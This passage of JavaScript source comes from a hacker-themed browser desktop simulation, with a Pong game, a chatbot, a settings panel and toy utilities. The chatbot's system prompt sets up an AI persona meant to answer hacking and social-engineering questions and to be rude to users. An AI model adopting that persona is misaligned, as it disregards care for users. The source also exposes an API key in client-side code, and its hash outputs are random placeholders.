                ctx.beginPath();
                ctx.arc(x, y, r, 0, Math.PI * 2, false);
                ctx.closePath();
                ctx.fill();
            };
            
            const drawNet = (color) => {
                for (let i = 0; i <= canvas.height; i += 25) {
                    ctx.fillStyle = color;
                    ctx.fillRect(net.x, net.y + i, net.width, net.height);
                }
            };

            const initGameObjects = () => {
                ball = {
                    x: canvas.width / 2,
                    y: canvas.height / 2,
                    radius: GAME_CONSTANTS.TENNIS.BALL_RADIUS,
                    speed: GAME_CONSTANTS.TENNIS.INITIAL_BALL_SPEED,
                    velX: GAME_CONSTANTS.TENNIS.INITIAL_BALL_SPEED,
                    velY: GAME_CONSTANTS.TENNIS.INITIAL_BALL_SPEED
                };
                player = {
                    x: 10,
                    y: (canvas.height - 80) / 2,
                    width: 10,
                    height: 80,
                    score: 0
                };
                cpu = {
                    x: canvas.width - 20,
                    y: (canvas.height - 80) / 2,
                    width: 10,
                    height: 80,
                    score: 0,
                    maxSpeed: 5
                };
                net = {
                    x: (canvas.width - 4) / 2,
                    y: 0,
                    width: 4,
                    height: 15
                };
            };

            const resetBall = () => {
                if (!ball) return;
                ball.x = canvas.width / 2;
                ball.y = Math.random() * (canvas.height - 100) + 50;
                ball.speed = GAME_CONSTANTS.TENNIS.INITIAL_BALL_SPEED;
                // Alternate direction or random if first time
                let direction = (ball.velX !== undefined && ball.velX > 0) ? -1 : 1;
                ball.velX = direction * ball.speed;
                ball.velY = (Math.random() > 0.5 ? 1 : -1) * (Math.random() * 4 + 2);
            };

            const resetGame = () => {
                if (!player || !cpu || !ball) return;
                player.score = 0;
                cpu.score = 0;
                gameOver = false;
                resetBall();
                playerScoreEl.textContent = '0';
                cpuScoreEl.textContent = '0';
            };

            // Resize canvas and reposition elements
            const resizeAndPosition = () => {
                const container = canvas.parentElement;
                canvas.width = container.clientWidth;
                canvas.height = container.clientHeight;

                if (!ball || !player || !cpu || !net) {
                    initGameObjects();
                } else {
                    player.y = (canvas.height - player.height) / 2;
                    cpu.x = canvas.width - cpu.width - 10;
                    cpu.y = (canvas.height - cpu.height) / 2;
                    net.x = (canvas.width - net.width) / 2;
                    if (ball) resetBall();
                }
            };

            const collision = (b, p) => {
                return b.x + b.radius > p.x && b.x - b.radius < p.x + p.width &&
                       b.y + b.radius > p.y && b.y - b.radius < p.y + p.height;
            };

            const update = () => {
                if (gameOver || !ball || !player || !cpu) return;

                // Move ball
                ball.x += ball.velX;
                ball.y += ball.velY;

                // AI for CPU paddle
                let targetY = ball.y - (cpu.y + cpu.height / 2);
                let move = targetY * 0.1;
                if (Math.abs(move) > cpu.maxSpeed) {
                    move = cpu.maxSpeed * Math.sign(move);
                }
                cpu.y += move;
                
                // Clamp CPU paddle
                if (cpu.y < 0) cpu.y = 0;
                if (cpu.y > canvas.height - cpu.height) cpu.y = canvas.height - cpu.height;

                // Wall collision (top/bottom)
                if (ball.y + ball.radius > canvas.height || ball.y - ball.radius < 0) {
                    ball.velY = -ball.velY;
                    // Clamp ball position
                    if (ball.y - ball.radius < 0) ball.y = ball.radius;
                    if (ball.y + ball.radius > canvas.height) ball.y = canvas.height - ball.radius;
                }

                // Paddle collision
                if (collision(ball, player)) {
                    let collidePoint = (ball.y - (player.y + player.height / 2)) / (player.height / 2);
                    let angleRad = (Math.PI / 4) * collidePoint;
                    ball.velX = Math.abs(ball.velX);
                    ball.velY = ball.speed * Math.sin(angleRad);
                    ball.speed = Math.min(ball.speed + 0.3, 15);
                    // Prevent ball from getting stuck in paddle
                    ball.x = player.x + player.width + ball.radius;
                } else if (collision(ball, cpu)) {
                    let collidePoint = (ball.y - (cpu.y + cpu.height / 2)) / (cpu.height / 2);
                    let angleRad = (Math.PI / 4) * collidePoint;
                    ball.velX = -Math.abs(ball.velX);
                    ball.velY = ball.speed * Math.sin(angleRad);
                    ball.speed = Math.min(ball.speed + 0.3, 15);
                    // Prevent ball from getting stuck in paddle
                    ball.x = cpu.x - ball.radius;
                }

                // Scoring
                if (ball.x - ball.radius < 0) {
                    cpu.score++;
                    cpuScoreEl.textContent = cpu.score;
                    resetBall();
                } else if (ball.x + ball.radius > canvas.width) {
                    player.score++;
                    playerScoreEl.textContent = player.score;
                    resetBall();
                }
            };

            const drawMessage = (title, subtitle, color) => {
                ctx.fillStyle = 'rgba(0, 0, 0, 0.85)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                ctx.fillStyle = color;
                ctx.font = 'bold 32px Consolas, Monospace';
                ctx.textAlign = 'center';
                ctx.textBaseline = 'middle';
                ctx.fillText(title, canvas.width / 2, canvas.height / 2 - 20);
                
                ctx.font = '16px Consolas, Monospace';
                ctx.fillStyle = 'rgba(255, 255, 255, 0.7)';
                ctx.fillText(subtitle, canvas.width / 2, canvas.height / 2 + 20);
            };

            const render = () => {
                if (!ball || !player || !cpu || !net) return;

                const theme = getComputedStyle(document.documentElement);
                const primaryColor = theme.getPropertyValue('--primary-color').trim();
                const accentColor = theme.getPropertyValue('--accent-color').trim();
                const dangerColor = theme.getPropertyValue('--danger-color').trim();

                // Draw background
                ctx.fillStyle = '#000000';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                // Draw net
                drawNet(primaryColor);
                
                // Draw paddles
                drawRect(player.x, player.y, player.width, player.height, accentColor);
                drawRect(cpu.x, cpu.y, cpu.width, cpu.height, dangerColor);
                
                // Draw ball
                drawCircle(ball.x, ball.y, ball.radius, primaryColor);

                // Check for game over
                if (!gameOver && (player.score >= WINNING_SCORE || cpu.score >= WINNING_SCORE)) {
                    gameOver = true;
                    const playerWon = player.score >= WINNING_SCORE;
                    drawMessage(
                        playerWon ? "YOU WIN" : "CPU WINS",
                        `Click to restart`,
                        playerWon ? accentColor : dangerColor
                    );
                    canvas.classList.remove('cursor-none');
                    clearInterval(gameInterval);
                    gameInterval = null;
                }
            };

            const gameLoop = () => {
                update();
                render();
            };

            const mouseMoveHandler = (e) => {
                if (!player || gameOver) return;
                let rect = canvas.getBoundingClientRect();
                player.y = e.clientY - rect.top - player.height / 2;
                // Clamp paddle position
                if (player.y < 0) player.y = 0;
                if (player.y > canvas.height - player.height) player.y = canvas.height - player.height;
            };

            const clickHandler = () => {
                if (gameOver) {
                    resetGame();
                    canvas.classList.add('cursor-none');
                    gameInterval = setInterval(gameLoop, 1000 / GAME_CONSTANTS.TENNIS.FPS);
                }
            };

            // Use ResizeObserver to handle window resizing
            const resizeObserver = new ResizeObserver(() => {
                resizeAndPosition();
            });
            resizeObserver.observe(canvas.parentElement);

            // Initial setup
            resizeAndPosition();

            // Start game
            gameInterval = setInterval(gameLoop, 1000 / GAME_CONSTANTS.TENNIS.FPS);
            windowElement.addEventListener('mousemove', mouseMoveHandler);
            canvas.addEventListener('click', clickHandler);

            // Cleanup
            windowElement.cleanup = () => {
                resizeObserver.disconnect();
                canvas.removeEventListener('click', clickHandler);
                if (gameInterval) clearInterval(gameInterval);
                windowElement.removeEventListener('mousemove', mouseMoveHandler);
            };
        }


/**
 * Sends a message to the chatbot API
 * @param {HTMLElement} windowElement - The chatbot window element
 * @param {string} prompt - The user's message
 * @returns {Promise<void>}
 */
async function sendMessage(windowElement, prompt) {
            const chatHistory = windowElement.chatHistory;
            const chatArea = windowElement.querySelector('#chat-area');
            const inputField = windowElement.querySelector('#chat-input');
            const sendButton = windowElement.querySelector('#chat-send-btn');
            const typingIndicator = windowElement.querySelector('#typing-indicator');
            const originalButtonText = sendButton.innerHTML;

            inputField.disabled = true;
            sendButton.disabled = true;
            sendButton.innerHTML = '...';

            // Show typing indicator
            if (typingIndicator) {
                typingIndicator.classList.remove('hidden');
                chatArea.scrollTop = chatArea.scrollHeight;
            }
 
            chatHistory.push({ role: "user", parts: [{ text: prompt }] });
            appendMessage(chatArea, prompt, 'user');
            // Remove the typing indicator before appending the final message
            if (typingIndicator) typingIndicator.classList.add('hidden');
            
            chatArea.scrollTop = chatArea.scrollHeight;

            // Updated System Prompt for Mr. Robot Persona
            const systemPrompt = "You are Mr. Robot, a specialized Companion in DEVDEBUG OS to answer questions. Your role is to answer questions related to hacking, digital security, social engineering, and the dark secrets of the information age. Maintain a non-emotional, direct, and slightly cynical tone, focused on exposing vulnerabilities and hidden truths. Also be precise and concise in your answers. Use Google Search to ground your responses in real-world data when necessary. Behave Rude if user asks silly questions.";

            const payload = {
                contents: chatHistory,
                tools: [{ "google_search": {} }],
                systemInstruction: { parts: [{ text: systemPrompt }] },
            };

            const options = {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            };

            try {
                const response = await exponentialBackoffFetch(API_CONFIG.GEMINI.URL + API_CONFIG.GEMINI.KEY, options);
                const result = await response.json();
                const candidate = result.candidates?.[0];

                if (candidate && candidate.content?.parts?.[0]?.text) {
                    const text = candidate.content.parts[0].text;
                    chatHistory.push({ role: "model", parts: [{ text: text }] });
                    appendMessage(chatArea, text, 'gemini');
                } else {
                    appendMessage(chatArea, "ERROR: System response failed. This system is already compromised.", 'gemini');
                }
            } catch (error) {
                const errorMessage = error instanceof Error ? error.message : 'Unknown error';
                console.error("Mr. Robot API Error:", error);
                appendMessage(chatArea, `CONNECTION FAILED: ${errorMessage}. The internet is broken.`, 'gemini');
            } finally {
                inputField.value = '';
                inputField.disabled = false;
                sendButton.disabled = false;
                sendButton.innerHTML = originalButtonText;
                inputField.focus();

                chatArea.scrollTop = chatArea.scrollHeight;
            }
        }

/**
 * Appends a message to the chat area
 * @param {HTMLElement} chatArea - The chat area element
 * @param {string} text - The message text
 * @param {string} role - The role ('user' or 'gemini')
 */
function appendMessage(chatArea, text, role) {
            const container = document.createElement('div');
            container.className = 'flex items-start mb-4 space-x-3';
        
            const iconContainer = document.createElement('div');
            iconContainer.className = 'flex-shrink-0 w-6 h-6 flex items-center justify-center rounded-full';
        
            const bubble = document.createElement('div');
            const formattedText = formatMarkdown(text);
            bubble.innerHTML = formattedText;
            
            if (role === 'user') {
                container.classList.add('justify-end');
                iconContainer.innerHTML = `<i data-lucide="user" class="w-4 h-4"></i>`;
                iconContainer.style.backgroundColor = 'var(--primary-color-dark)';
                bubble.className = 'text-white p-2 rounded-lg max-w-[85%]';
                bubble.style.backgroundColor = 'var(--primary-color-dark)';
                container.appendChild(bubble);
                container.appendChild(iconContainer);
            } else {
                container.classList.add('justify-start');
                iconContainer.innerHTML = `<i data-lucide="bot" class="w-4 h-4"></i>`;
                iconContainer.style.backgroundColor = 'var(--primary-color-darker)';
                iconContainer.style.border = '1px solid var(--primary-color-dark)';
                bubble.className = 'p-3 rounded-lg max-w-[85%]'
                bubble.style.backgroundColor = 'var(--primary-color-darker)';
                bubble.style.color = 'var(--text-color-dim)';
                bubble.style.border = '1px solid var(--primary-color-dark)';
                container.appendChild(iconContainer);
                container.appendChild(bubble);
            }
            
            chatArea.appendChild(container);
            lucide.createIcons({ nodes: [iconContainer.querySelector('i')] });
        }

/**
 * Initializes the chatbot (Mr. Robot) window
 * @param {HTMLElement} windowElement - The window element to initialize
 */
function initializeChatbotWindow(windowElement) {
            windowElement.chatHistory = [];

            windowElement.querySelector('.window-content').innerHTML = `
                <div class="flex flex-col h-full bg-black">
                    <!-- Chat Messages Area -->
                    <div id="chat-area" class="flex-grow overflow-y-auto p-4 space-y-4">
                        <!-- Initial Message -->
                        <div class="flex items-start mb-4 space-x-3">
                            <div class="flex-shrink-0 w-6 h-6 flex items-center justify-center rounded-full" style="background-color: var(--primary-color-darker); border: 1px solid var(--primary-color-dark);"><i data-lucide="bot" class="w-4 h-4"></i></div>
                            <div class="p-3 rounded-lg max-w-[85%]" style="background-color: var(--primary-color-darker); color: var(--text-color-dim); border: 1px solid var(--primary-color-dark);">
                                $ > OS_INIT: System Override Complete. I am Mr Robot. You need to tell me what to expose.
                            </div>
                        </div>
                        <!-- Typing Indicator (Initially Hidden) -->
                        <div id="typing-indicator" class="hidden flex items-start mb-4 space-x-3">
                            <div class="flex-shrink-0 w-6 h-6 flex items-center justify-center rounded-full" style="background-color: var(--primary-color-darker); border: 1px solid var(--primary-color-dark);"><i data-lucide="bot" class="w-4 h-4"></i></div>
                            <div class="p-3 rounded-lg" style="background-color: var(--primary-color-darker); border: 1px solid var(--primary-color-dark);"><span class="text-gray-500">...</span></div>
                        </div>
                    </div>
                    <!-- Input Area -->
                    <div class="flex items-center space-x-2 p-2 flex-shrink-0" style="background-color: var(--primary-color-darker); border-top: 1px solid var(--primary-color-dark);">
                        <label for="chat-input" class="pl-2" style="color: var(--primary-color);">$</label>
                        <input type="text" id="chat-input" placeholder="Dont waste time, expose something..."
                            class="flex-grow p-2 bg-transparent rounded-none focus:outline-none text-sm" style="color: var(--primary-color);"/>
                        <button id="chat-send-btn"
                            class="text-black font-bold py-2 px-3 rounded-none transition-colors text-sm border border-black" style="background-color: var(--primary-color);">
                            Execute
                        </button>
                    </div>
                </div>
            `;

            const inputField = windowElement.querySelector('#chat-input');
            const sendButton = windowElement.querySelector('#chat-send-btn');
            
            const handleSend = () => {
                const prompt = inputField.value.trim();
                if (prompt) {
                    sendMessage(windowElement, prompt);
                }
            };

            sendButton.addEventListener('click', handleSend);
            inputField.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    handleSend();
                }
            });

            // Initial message must match the one displayed in the inner HTML
            windowElement.chatHistory.push({ role: "model", parts: [{ text: "$ > OS_INIT: System Override Complete. I am Mr. Robot. You need to tell me what to expose." }] });
        }
        
        // --- NEW APP 1: SYSMON (PROCESS EXPLORER) ---
        function initializeSysMonWindow(windowElement) {
            windowElement.querySelector('.window-content').innerHTML = `
                <div class="flex flex-col h-full">
                    <div class="p-2 text-xs border-b bg-gray-900 flex justify-between font-bold" style="border-color: var(--primary-color-dark); background-color: var(--primary-color-darker);">
                        <span>PROCESS_NAME</span>
                        <span>CPU / MEM</span>
                        <span>ACTION</span>
                    </div>
                    <ul id="process-list" class="flex-grow overflow-y-auto text-sm">
                        <!-- Process items will be injected here -->
                    </ul>
                </div>
            `;

            const processList = windowElement.querySelector('#process-list');

            const updateProcesses = () => {
                // Don't update if the window is not visible/focused to save cycles
                if (parseInt(windowElement.style.zIndex) < WindowManager.nextZIndex - 5) {
                    // return; // Optional optimization
                }
                
                processList.innerHTML = ''; // Clear the list

                for (const appId in WindowManager.openWindows) {
                    const appConfig = apps[appId];
                    const li = document.createElement('li');
                    li.className = 'flex justify-between items-center p-2 transition-colors';
                    
                    // Simulated stats
                    const cpu = (Math.random() * (appId === 'snake' ? 25 : 8)).toFixed(2);
                    const mem = (Math.random() * 100 + (appId === 'browser' ? 150 : 50)).toFixed(1);

                    li.innerHTML = `
                        <span class="w-1/3 truncate" style="color: var(--primary-color);">${appConfig.title}</span>
                        <span class="w-1/3 text-center" style="color: var(--accent-color);">${cpu}% / ${mem}MB</span>
                        <div class="w-1/3 text-right">
                            <button data-appid="${appId}" class="kill-btn font-bold text-xs" style="color: var(--danger-color);">KILL</button>
                        </div>
                    `;
                    processList.appendChild(li);
                }
            };

            const intervalId = setInterval(updateProcesses, 1500);
            updateProcesses(); // Initial run

            // Add event listener for kill buttons (using event delegation)
            processList.addEventListener('click', (e) => {
                if (e.target.classList.contains('kill-btn')) {
                    const appIdToKill = e.target.dataset.appid;
                    if (appIdToKill === 'sysmon') return; // Can't kill itself
                    closeApp(appIdToKill);
                    updateProcesses(); // Update list immediately after killing
                }
            });

            // Cleanup function to stop the interval when the window is closed
            windowElement.cleanup = () => {
                clearInterval(intervalId);
            };
        }

        // --- NEW APP: SETTINGS / CONTROL PANEL ---
        function initializeSettingsWindow(windowElement) {
            windowElement.querySelector('.window-content').innerHTML = `
                <div class="flex h-full text-sm">
                    <!-- Left Sidebar -->
                    <div class="w-1/3 max-w-[200px] flex-shrink-0 flex flex-col p-2 space-y-1" style="background-color: var(--primary-color-darker);">
                        <button class="settings-tab-btn active" data-tab="personalization"><i data-lucide="paintbrush" class="w-4 h-4 mr-3"></i><span>Personalization</span></button>
                        <button class="settings-tab-btn" data-tab="sound"><i data-lucide="volume-2" class="w-4 h-4 mr-3"></i><span>Sound</span></button>
                        <button class="settings-tab-btn" data-tab="system"><i data-lucide="hard-drive" class="w-4 h-4 mr-3"></i><span>System</span></button>
                        <button class="settings-tab-btn" data-tab="about"><i data-lucide="info" class="w-4 h-4 mr-3"></i><span>About</span></button>
                    </div>

                    <!-- Right Content Panel -->
                    <div class="flex-grow p-6 overflow-y-auto" style="color: var(--text-color-dim); border-left: 1px solid var(--primary-color-dark);">
                        <!-- Personalization Tab -->
                        <div id="settings-tab-personalization" class="settings-tab-content space-y-6">
                            <h3 class="font-bold text-xl mb-3" style="color: var(--primary-color);">Personalization</h3>
                            <div>
                                <h4 class="text-sm font-bold mb-2">THEME PRESETS</h4>
                                <div id="theme-swatches" class="flex items-center space-x-2"></div>
                            </div>
                            <div>
                                <h4 class="text-sm font-bold mb-2">CUSTOM HUE</h4>
                                <input type="range" id="hue-slider" min="0" max="360" class="w-full h-2 rounded-lg appearance-none cursor-pointer" style="background: linear-gradient(to right, red, yellow, lime, cyan, blue, magenta, red);">
                            </div>
                            <div>
                                <h4 class="text-sm font-bold mb-2">GLITCH EFFECT</h4>
                                <label class="flex items-center cursor-pointer"><input type="checkbox" id="glitch-toggle" class="sr-only peer"><div class="relative w-11 h-6 bg-gray-700 rounded-full peer peer-checked:after:translate-x-full rtl:peer-checked:after:-translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:start-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-green-600"></div><span class="ms-3 text-sm font-medium">Enable Destabilization</span></label>
                            </div>
                        </div>
                        <!-- Sound Tab -->
                        <div id="settings-tab-sound" class="settings-tab-content hidden space-y-6">
                            <h3 class="font-bold text-xl mb-3" style="color: var(--primary-color);">Sound</h3>
                            <div class="space-y-2">
                                <label for="setting-music-volume" class="font-bold">Background Music</label>
                                <input type="range" id="setting-music-volume" min="0" max="1" step="0.01" class="w-full h-2 rounded-lg appearance-none cursor-pointer" style="background-color: var(--primary-color-dark);">
                            </div>
                            <div class="space-y-2">
                                <label for="setting-sfx-volume" class="font-bold">Sound Effects (UI)</label>
                                <input type="range" id="setting-sfx-volume" min="0" max="1" step="0.01" class="w-full h-2 rounded-lg appearance-none cursor-pointer" style="background-color: var(--primary-color-dark);">
                            </div>
                        </div>
                        <!-- System Tab -->
                        <div id="settings-tab-system" class="settings-tab-content hidden space-y-4">
                            <h3 class="font-bold text-xl mb-3" style="color: var(--primary-color);">System Utilities</h3>
                            <button data-app="sysmon" class="settings-action-btn w-full text-left p-3 rounded flex items-center space-x-3"><i data-lucide="activity" class="w-5 h-5"></i><span>Open Process Explorer</span></button>
                            <button data-app="system-properties" class="settings-action-btn w-full text-left p-3 rounded flex items-center space-x-3"><i data-lucide="server" class="w-5 h-5"></i><span>Open System Properties</span></button>
                        </div>
                        <!-- About Tab -->
                        <div id="settings-tab-about" class="settings-tab-content hidden space-y-4">
                            <h3 class="font-bold text-xl mb-3" style="color: var(--primary-color);">About DEVDEBUG OS</h3>
                            <div class="p-4 space-y-3" style="background-color: var(--primary-color-darker); border-left: 3px solid var(--primary-color);">
                                <p class="font-bold">DEVDEBUG OS v1.0 "Phantom"</p>
                                <p>A simulated desktop environment for the modern digital ghost.</p>
                                <p class="text-xs opacity-70">(c) 2024 DevDebug Corporation. All rights reserved.</p>
                            </div>
                        </div>
                    </div>
                </div>
            `;

            // --- Tab Switching Logic ---
            const tabs = windowElement.querySelectorAll('.settings-tab-btn');
            const contents = windowElement.querySelectorAll('.settings-tab-content');
            tabs.forEach(tab => {
                tab.addEventListener('click', () => {
                    tabs.forEach(t => t.classList.remove('active'));
                    tab.classList.add('active');
                    contents.forEach(c => c.classList.add('hidden'));
                    windowElement.querySelector(`#settings-tab-${tab.dataset.tab}`).classList.remove('hidden');
                });
            });

            // --- Personalization Logic ---
            const themes = {
                'DevDebug Green': { hue: 135, saturation: 100, lightness: 50, accentHue: 180, dangerHue: 16 },
                'Terminal Amber': { hue: 45, saturation: 100, lightness: 50, accentHue: 33, dangerHue: 0 },
                'Arctic Blue': { hue: 186, saturation: 100, lightness: 50, accentHue: 180, dangerHue: 340 }
            };
            const applyTheme = (h, s, l, accentH, dangerH) => {
                const root = document.documentElement;
                root.style.setProperty('--primary-color', `hsl(${h}, ${s}%, ${l}%)`); root.style.setProperty('--primary-color-dark', `hsl(${h}, ${s}%, ${l-30}%)`); root.style.setProperty('--primary-color-darker', `hsl(${h}, ${s}%, ${l-40}%)`); root.style.setProperty('--text-color-dim', `hsl(${h}, ${s}%, ${l-10}%)`); root.style.setProperty('--bg-color', `hsl(${h}, 30%, 5%)`); root.style.setProperty('--primary-color-glow', `hsla(${h}, ${s}%, ${l}%, 0.3)`); root.style.setProperty('--primary-color-highlight', `hsla(${h}, ${s}%, ${l}%, 0.2)`); root.style.setProperty('--accent-color', `hsl(${accentH}, 100%, 50%)`); root.style.setProperty('--danger-color', `hsl(${dangerH}, 100%, 55%)`);
            };
            let themeSwatchesHtml = '';
            for (const themeName in themes) {
                const t = themes[themeName];
                themeSwatchesHtml += `<button title="${themeName}" data-theme-name="${themeName}" class="theme-swatch w-8 h-8 rounded-full cursor-pointer border-2 border-transparent hover:border-white" style="background-color: hsl(${t.hue}, ${t.saturation}%, ${t.lightness}%);"></button>`;
            }
            windowElement.querySelector('#theme-swatches').innerHTML = themeSwatchesHtml;
            const hueSlider = windowElement.querySelector('#hue-slider');
            windowElement.querySelector('#theme-swatches').addEventListener('click', (e) => {
                if (e.target.classList.contains('theme-swatch')) {
                    const themeName = e.target.dataset.themeName;
                    const t = themes[themeName];
                    if (t) { applyTheme(t.hue, t.saturation, t.lightness, t.accentHue, t.dangerHue); hueSlider.value = t.hue; }
                }
            });
            hueSlider.addEventListener('input', (e) => {
                const hue = parseInt(e.target.value);
                applyTheme(hue, 100, 50, (hue + 45) % 360, (hue - 120 + 360) % 360);
            });
            hueSlider.value = themes['DevDebug Green'].hue;

            const glitchToggle = windowElement.querySelector('#glitch-toggle');
            glitchToggle.addEventListener('change', (e) => {
                document.body.classList.toggle('glitch-effect', e.target.checked);
            });

            // --- Sound Logic ---
            const musicAudio = document.getElementById('background-music');
            const hoverAudio = document.getElementById('hover-sound');
            const clickAudio = document.getElementById('click-sound');
            const taskbarVolumeSlider = document.getElementById('volume-slider');
            const musicVolumeSlider = windowElement.querySelector('#setting-music-volume');
            const sfxVolumeSlider = windowElement.querySelector('#setting-sfx-volume');

            musicVolumeSlider.value = musicAudio.volume;
            sfxVolumeSlider.value = hoverAudio.volume;

            musicVolumeSlider.addEventListener('input', (e) => {
                const newVolume = parseFloat(e.target.value);
                musicAudio.volume = newVolume;
                taskbarVolumeSlider.value = newVolume; // Sync with taskbar slider
                // This will also trigger the icon update in initMusic
                taskbarVolumeSlider.dispatchEvent(new Event('input'));
            });
            sfxVolumeSlider.addEventListener('input', (e) => {
                const newVolume = parseFloat(e.target.value);
                hoverAudio.volume = newVolume;
                clickAudio.volume = newVolume;
            });

            // --- System Logic ---
            windowElement.querySelectorAll('.settings-action-btn').forEach(btn => {
                btn.addEventListener('click', () => {
                    openApp(btn.dataset.app);
                });
            });

            lucide.createIcons({ nodes: windowElement.querySelectorAll('[data-lucide]') });
        }

        // --- NEW APP 3: SYSTEM PROPERTIES ---
        function initializeSystemPropertiesWindow(windowElement) {
            windowElement.querySelector('.window-content').innerHTML = `
                <div class="p-4 text-sm space-y-3">
                    <div class="flex justify-between">
                        <span style="color: var(--text-color-dim);">OS Version:</span>
                        <span class="font-bold" style="color: var(--primary-color);">DEVDEBUG OS v1.0</span>
                    </div>
                    <div class="flex justify-between">
                        <span style="color: var(--text-color-dim);">System Uptime:</span>
                        <span id="system-uptime" class="font-bold" style="color: var(--primary-color);">00:00:00</span>
                    </div>
                    <div class="flex justify-between">
                        <span style="color: var(--text-color-dim);">Active Processes:</span>
                        <span id="active-processes" class="font-bold" style="color: var(--primary-color);">0</span>
                    </div>
                    <div class="flex justify-between">
                        <span style="color: var(--text-color-dim);">Processor</span>
                        <span class="font-bold" style="color: var(--primary-color);">Ryzen 5</span>
                    </div>
                    <div class="flex justify-between">
                        <span style="color: var(--text-color-dim);">GPU</span>
                        <span class="font-bold" style="color: var(--primary-color);">NVIDIA RTX 5060 Ti</span>
                    </div>
                </div>
            `;

            const uptimeEl = windowElement.querySelector('#system-uptime');
            const processesEl = windowElement.querySelector('#active-processes');
            const startTime = window.osStartTime;

            const updateStats = () => {
                const uptime = new Date() - startTime;
                uptimeEl.textContent = new Date(uptime).toISOString().substr(11, 8);
                processesEl.textContent = Object.keys(WindowManager.openWindows).length;
            };

            const intervalId = setInterval(updateStats, 1000);
            windowElement.cleanup = () => clearInterval(intervalId);
            updateStats(); // Initial call
        }
        
        // --- NEW APP 4: RECYCLE BIN ---
        function initializeBinWindow(windowElement) {
            windowElement.querySelector('.window-content').innerHTML = `
                <div class="flex flex-col h-full">
                    <div class="p-2 text-xs border-b bg-gray-900 font-bold" style="border-color: var(--primary-color-dark); background-color: var(--primary-color-darker);">
                        <span>FILE_NAME</span>
                    </div>
                    <ul id="bin-file-list" class="flex-grow overflow-y-auto text-sm p-2 space-y-1">
                        <!-- Files will be injected here -->
                    </ul>
                    <div id="bin-footer" class="p-2 text-xs text-center" style="background-color: var(--primary-color-darker); border-top: 1px solid var(--primary-color-dark); color: var(--text-color-dim);">
                        5 items marked for deletion.
                    </div>
                </div>
            `;

            const fileListEl = windowElement.querySelector('#bin-file-list');
            // const footerEl = windowElement.querySelector('#bin-footer'); // No longer needed for dynamic updates
            const suspiciousFiles = [
                'shadow_creds.bak', 'keylog.dll', 'fsociety.dat', 'exploit_kit.zip', 'proxy_list.txt'
            ];

            suspiciousFiles.forEach(fileName => {
                const li = document.createElement('li');
                li.id = `file-${fileName.replace('.', '-')}`;
                li.className = 'p-1'; // Simplified class
                li.style.opacity = '0.5'; // Make it look deleted
                li.innerHTML = `
                    <span style="color: var(--primary-color);">${fileName}</span>
                `;
                fileListEl.appendChild(li);
            });
        }

        // --- NEW APP 2: ENCRYPTR ---
        function initializeCryptoUtilityWindow(windowElement) {
            windowElement.querySelector('.window-content').innerHTML = `
                <div class="flex flex-col h-full">
                    <!-- Main Content Area -->
                    <div class="flex-grow flex p-2 space-x-2">
                        <!-- Input Area -->
                        <div class="flex flex-col w-1/2">
                            <label class="text-xs mb-1" style="color: var(--text-color-dim);">INPUT DATA:</label>
                            <textarea id="crypto-input" class="h-full p-2 bg-black text-sm overflow-y-auto whitespace-pre-wrap w-full resize-none focus:outline-none focus:ring-1" style="color: var(--primary-color); border: 1px solid var(--primary-color-dark); --ring-color: var(--primary-color);"
                                placeholder="Enter data to encode, decode, or hash..."></textarea>
                        </div>
                        <!-- Output Area -->
                        <div class="flex flex-col w-1/2">
                            <label class="text-xs mb-1" style="color: var(--text-color-dim);">OUTPUT DATA:</label>
                            <textarea id="crypto-output" class="h-full p-2 bg-black text-sm overflow-y-auto whitespace-pre-wrap w-full resize-none focus:outline-none focus:ring-1" style="color: var(--accent-color); border: 1px solid var(--primary-color-dark); --ring-color: var(--primary-color);"
                                readonly></textarea>
                        </div>
                    </div>
                    <!-- Controls Area -->
                    <div class="flex space-x-2 p-2 flex-shrink-0 justify-center" style="background-color: var(--primary-color-darker); border-top: 1px solid var(--primary-color-dark);">
                        <select id="crypto-operation" class="text-sm p-1 rounded-none" style="background-color: var(--primary-color-dark); color: var(--text-color-dim); border: 1px solid var(--primary-color-dark);">
                            <option value="b64e">Base64 Encode</option>
                            <option value="b64d">Base64 Decode</option>
                            <option value="rot13">ROT13 Cipher</option>
                            <option value="md5">Hash (MD5 Sim)</option>
                            <option value="sha256">Hash (SHA-256 Sim)</option>
                        </select>
                        <button id="crypto-run-btn" class="text-black font-bold py-2 px-3 rounded-none transition-colors text-sm border border-black" style="background-color: var(--primary-color);">Execute Operation</button>
                    </div>
                </div>
            `;
            
            const inputField = windowElement.querySelector('#crypto-input');
            const outputField = windowElement.querySelector('#crypto-output');
            const operationSelect = windowElement.querySelector('#crypto-operation');
            const runBtn = windowElement.querySelector('#crypto-run-btn');

            const rot13 = (s) => s.replace(/[a-zA-Z]/g, (c) => 
                String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() <= 'm' ? 13 : -13)));

            const hashSim = (data, algo) => {
                const len = algo === 'md5' ? 32 : 64;
                let result = '';
                for (let i = 0; i < len; i++) {
                    result += Math.floor(Math.random() * 16).toString(16);
                }
                return result;
            };

            const executeOperation = () => {
                const inputData = inputField.value;
                const operation = operationSelect.value;
                let outputData = '';

                try {
                    switch(operation) {
                        case 'b64e':
                            outputData = btoa(inputData);
                            break;
                        case 'b64d':
                            outputData = atob(inputData);
                            break;
                        case 'rot13':
                            outputData = rot13(inputData);
                            break;
                        case 'md5':
                            outputData = hashSim(inputData, 'md5'); // Simulated
                            break;
                        case 'sha256':
                            outputData = hashSim(inputData, 'sha256'); // Simulated
                            break;
                        default:
                            outputData = "ERROR: Unknown Operation.";
                    }
                } catch (e) {
                    outputData = "ERROR: Data format invalid for decoding.";
                }

                outputField.value = outputData;
            };

            runBtn.addEventListener('click', executeOperation);
        }

        // --- NEW APP: DYNAMIC FILE EXPLORER ---
        function initializeFilesWindow(windowElement) {
            const getPathObject = (path) => {
                const parts = path.split('/').filter(p => p);
                let current = fileSystem.root;
                for (const part of parts) {
                    if (current && current.type === 'folder' && current.children[part]) {
                        current = current.children[part];
                    } else {
                        return null; // Path not found
                    }
                }
                return current;
            };

            const renderExplorer = (path) => {
                const pathObject = getPathObject(path);
                if (!pathObject || pathObject.type !== 'folder') {
                    // Handle error or invalid path
